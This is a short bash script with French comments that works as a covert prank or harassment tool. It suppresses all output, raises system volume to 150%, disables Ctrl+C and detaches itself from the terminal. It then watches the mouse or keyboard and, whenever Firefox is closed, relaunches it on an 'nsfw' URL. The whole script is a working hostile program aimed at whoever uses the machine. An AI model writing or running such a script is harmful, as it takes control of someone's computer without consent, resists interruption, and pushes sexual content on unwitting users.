#!/bin/bash

# Redirige TOUT vers /dev/null (stdout et stderr)
exec 1>/dev/null 2>/dev/null

# Monte le volume silencieusement
wpctl set-volume @DEFAULT_SINK@ 1.5 &

# Désactive Ctrl+C
trap '' INT

# Trouve automatiquement le bon périphérique d'entrée (souris ou clavier)
DEVICE_ID=$(xinput list | grep -i "pointer\|keyboard" | grep -i "slave" | head -1 | sed 's/.*id=\([0-9]*\).*/\1/')

# Si pas de périphérique trouvé, utilise 9 par défaut
if [ -z "$DEVICE_ID" ]; then
    DEVICE_ID=9
fi

# Boucle infinie en arrière-plan
xinput test "$DEVICE_ID" 2>/dev/null | while read -r line; do
    # Vérifie si Firefox tourne
    if ! pgrep -x firefox >/dev/null 2>&1 && \
       ! pgrep -x firefox-bin >/dev/null 2>&1 && \
       ! pgrep -x Firefox >/dev/null 2>&1; then
        # Lance Firefox en mode invisible (sans sortie)
        nohup firefox --new-window "matias.me/nsfw" >/dev/null 2>&1 &
        # Petit délai pour éviter de spam
        sleep 2
    fi
done &

# Détache le script du terminal
disown -a
